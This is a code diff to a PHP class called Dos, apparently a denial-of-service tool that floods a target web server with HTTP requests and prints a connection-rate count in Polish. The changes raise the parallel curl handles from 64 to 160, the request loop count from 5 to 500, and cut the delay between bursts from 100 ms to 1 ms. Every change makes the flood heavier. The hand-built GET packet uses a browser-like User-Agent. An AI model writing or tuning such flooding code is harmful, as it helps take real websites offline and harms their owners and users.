@@ -393,7 +393,7 @@ class Dos
 			{
 				$aCurlMulti[ $i ] = curl_multi_init();
 
-				for( $j = 0; $j < 64; $j++ )
+				for( $j = 0; $j < 160; $j++ )
 				{
 					$aCurl[ $j ] = curl_init();
 
@@ -401,10 +401,15 @@ class Dos
 					curl_multi_add_handle( $aCurlMulti[ $i ], $aCurl[ $j ] );
 				}
 
-				for( $j = 0; $j < 5; $j++  )
+				for( $j = 0; $j < 500; $j++  )
 				{
 					curl_multi_exec( $aCurlMulti[ $i ], $iRes );
-					usleep( 100000 );
+					usleep( 1000 );
+
+					if( $iRes === 0 )
+					{
+						break ;
+					}
 				}
 
 				if( ++$i % 10 === 0 )
@@ -421,7 +426,7 @@ class Dos
 			}
 			while( $this -> fTime > microtime( 1 ) );
 
-			printf( "\r\n\r\nUstanowiono %d połączeń w ciągu %d sekund, prędkość: %d c/s\r\n", $i * 64, $this -> iTime, $i * 64 / $this -> iTime  );
+			printf( "\r\n\r\nUstanowiono %d połączeń w ciągu %d sekund, prędkość: %d c/s\r\n", $i * 160, $this -> iTime, $i * 160 / $this -> iTime  );
 
 		}
 		/**
@@ -435,11 +440,11 @@ class Dos
 			$sHost = $aHost[1];
 
 			$sPacket = sprintf( "GET %s HTTP/1.1\r\n" .
-				   "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.11 (pl,pl-PL;q=0.9,en;q=0.8)\r\n" .
-				   "Host: %s\r\n" .
-				   "Accept: */*\r\n" .
-				   "Connection: Keep-Alive\r\n\r\n",
-				   $sUrl, $sHost
+					"User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.11 (pl,pl-PL;q=0.9,en;q=0.8)\r\n" .
+					"Host: %s\r\n" .
+					"Accept: */*\r\n" .
+					"Connection: Keep-Alive\r\n\r\n",
+					$sUrl, $sHost
 			);
 
 			$this -> sHost = gethostbyname( $sHost );
